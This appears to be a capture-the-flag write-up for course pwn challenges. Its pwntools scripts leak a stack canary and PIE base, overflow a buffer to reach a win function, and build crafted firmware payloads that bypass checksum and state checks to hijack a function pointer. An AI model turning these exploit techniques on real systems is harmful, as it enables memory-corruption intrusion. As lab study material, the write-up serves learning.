## stack-dump2

* its almost the same except you checksec with `PIE enabled`
* all we need to know is the win func addr, first we can dump base addr by `p` cmd

	```
	p.sendline(b"\n\np")
	line = p.recvuntil(b'heap').decode('latin-1').rstrip()
	print('line:', line)
	#
	base_address = get_base_address(line)
	print("base_address:", base_address)
	```

* calculate win addr by `offset`

	```
	win_addr_int = int(base_address, 16) + int('0x1219', 16)
	print("win_addr_int:", hex(win_addr_int))
	win_addr = p64(win_addr_int)
	```

* script

	```
	from pwn import *
	def get_base_address(memory_map_output):
	    for line in memory_map_output.splitlines():
	        # Check if the line contains the binary name and an 'r-xp' segment (executable section)
	        if '00000000' in line:
	            # Extract the base address (start of the memory range)
	            base_address = line.split('-')[0].lstrip('$').strip()
	            print("base_address is {}".format(base_address))
	            return '0x' + base_address
	    return None
	
	def interact_with_process(binary_path, host=None, port=None):
	    # Start the process
	    if host and port:
	        p = remote(host, port)
	    elif args.HOST:
	        p = process(binary_path)
	    else:
	        context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
	        p = gdb.debug('./stack-dump2',
	                      gdbscript='''
	                          b *0x401319
	                          c
	                          ''')
	
	    prompt = p.recvuntil(b'[q]uit').decode('utf-8')
	    address_match = re.search(r'0x[0-9a-fA-F]+', prompt)
	    if address_match:
	        address = int(address_match.group(0), 16)  # Convert address to integer
	        print("address:", hex(address))
	
	        canary_address = address + 65
	        print("Modified address (address + 65):", hex(canary_address))
	
	        # Send the "i" command to the process
	        p.sendline(b"i")
	        p.recvuntil(b'len:')
	        p.sendline(p64(canary_address))
	
	        p.sendline(b"\nd")
	        p.recvuntil(b': ').decode('utf-8')
	        stack_canary = p.recv(8)
	        # stack_canary = stack_canary[::-1]
	        print("canary:", stack_canary, len(stack_canary))
	        # get win adr
	        p.sendline(b"\n\np")
	        line = p.recvuntil(b'heap').decode('latin-1').rstrip()
	        print('line:', line)
	        #
	        base_address = get_base_address(line)
	        print("base_address:", base_address)
	        win_addr_int = int(base_address, 16) + int('0x1219', 16)
	        print("win_addr_int:", hex(win_addr_int))
	        win_addr = p64(win_addr_int)
	        #
	        # make bufferoverflow
	        p.sendline(b"\n\ni")
	        p.recvuntil(b'len:')
	
	        payload = b"A" * 56 + stack_canary + b"A" * 24 + win_addr
	        p.sendline(payload)
	        print("payload: ", payload)
	
	        p.recvline().decode('utf-8')
	        p.recvline().decode('utf-8')
	        p.sendline(b"\n\n\nq")
	
	
	    p.interactive()
	
	
	# Example usage
	interact_with_process('', '6447.lol', 5003)
	# interact_with_process('../w2/stack-dump')
	
	```

## nuclear1


* update firmware to reach flag1
	* pass the checksum which the first 4bytes must be `FW12`, and the sum(5th, 6th) = sum(7th~512th)

* writeup

	```
	from pwn import *
	
	
	context.arch = 'amd64'
	if args.REMOTE:
	    p = remote('6447.lol', 5002)
	elif args.HOST:
	    p = process('./nuclear')
	
	firmware_header = b'FW12'
	firmware_body = p8(0x00) + p8(0x00)
	
	firmware_tail = b'\x00' * (512 - 6)
	
	payload = firmware_header + firmware_body + firmware_tail
	print(payload.decode('utf-8'))
	p.sendlineafter(b">> 6447 Nuclear Terminal Facility (Medical Purposes Only)", b"U")
	p.sendlineafter(b'>', payload)
	
	p.interactive()
	
	```

## nuclear2

* execute firmware get flag1
	* checksum: same as above
	* precheck: firmupdated != 0 && data4224 == 0
		* since firmupdated didnt find a place to overwrite it 
		* however data4224 canbe overwritten when case08, payload \x38\x00 set data4224 to 0
	* pass speed > 27999 teminate when case03, change result sincedata4228 = result, change it to 1 then pass the speed limitation, the payload \x33\x36
	* speed > 27999 which speed should be 28000, case 06: speed += 1000, then we need run 28 times of case06

* script

	```
	# firmware_body = p8(0x00) + p8(0x36)
	# firmware_tail = b'\x00' * 505 + b'\x36'
	
	from pwn import *
	
	context.arch = 'amd64'
	if args.REMOTE:
	    p = remote('6447.lol', 5002)
	elif args.HOST:
	    p = process('./nuclear')
	else:
	    context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
	    p = gdb.debug('./nuclear',
	                  gdbscript='''
	                  b *execute_firmware + 62
	                  b *checksum + 227
	                  b *run+267
	                  c
	                  ''')
	# b * checksum + 202
	# execute_firmware + 62
	#
	# update
	header = b'FW12'
	data4224 = b'\x38'
	data4228 = b'\x33'
	flag2 = b'\x35'
	speed_up = b'\x36'
	len = 30
	
	middle = speed_up * len
	
	arg56 = p8(0) + b'\xfe'
	
	padding = b'\x00' * (512 - 4 - 6 - len - 1)
	
	payload = header + arg56 + data4224 + b'\x00' + data4228 + middle + flag2 + padding
	# 6000
	p.sendlineafter(b">> 6447 Nuclear Terminal Facility (Medical Purposes Only)", b"U")
	p.sendlineafter(b'>', payload)
	p.recvline()
	
	p.sendline(b'E')
	print(p.recvlines(11))
	
	p.interactive()
	```

## nuclear3 -`tedious`

* checksec everything is okie, try another way
* if goto win, we need to know win addr
* leak the addr by take advantage of `[+] material_loaded=%s\n` in run func
	* by gdb debugging, find the original addr saved is run func addr
	* calculate the `offset` from run to win : 0x222
	* change payload try not to do anything just rearch the run func, just print the original stuff which is runfunc addr
	* get the win func addr by substract 0x222
* case 02 overwrite the addr to winfunc addr
* payload

	```
	header = b'FW12'
	skip = b'\x38\x00\x33\x36'
	r32 = b'\x32\x01' * 32
	tail = b'\x35\x43'
	
	combined = skip + r32 + tail
	total_sum = sum(combined)
	r6 = p8(total_sum % 256)
	print('r6: ',r6.hex())
	checksum = b'\x00' + r6
	
	padding = b'\x00' * (512 - 4 - 2 - 4 - 64 - 2)
	payload = header + checksum + skip + r32 + tail + padding
	
	```
* update firmware by above payload

	```
	p.sendlineafter(b">> 6447 Nuclear Terminal Facility (Medical Purposes Only)", b"U")
p.sendlineafter(b'>', payload)
p.recvline()
	```

* execute firmware get run runc addr

	```
	p.sendline(b'E')
# addr = p.recvline().decode('latin-1')
data = p.recvlines(11)
for d in data:
    if b'\x01' in d:
        hex_string = d.split(b'\x01')[-1].hex()
        reversed_bytes = ''.join(reversed([hex_string[i:i + 2] for i in range(0, len(hex_string), 2)]))
        address = f"0x{reversed_bytes}"
        win_int_addr = int(address, 16) - 0x222
        win_addr = p64(win_int_addr)
        print('win_addr: ', [bytes([byte]) for byte in win_addr])
	```
	
* overwrite to win func addr
	
	* update payload
	
		```
		header = b'FW12'
		skip = b'\x38\x00\x33\x36'
		need_to_win = b''.join(b'\x32' + bytes([byte]) for byte in win_addr)
		tail = b'\x35\x43'
		
		combined = skip + need_to_win + tail
		total_sum = sum(combined)
		r6 = p8(total_sum % 256)
		print('r6: ',r6.hex())
		checksum = b'\x00' + r6
		
		padding = b'\x00' * (512 - 4 - 2 - 4 - 16 - 2)
		
		payload = header + checksum + skip + need_to_win + tail + padding
		

		p.sendline(b'U')
		p.sendlineafter(b'>', payload)
		p.recvline()
		```
	* goto win since we replace the runfunc addr to win func addr
	
		```
		p.sendline(b'E')
		```



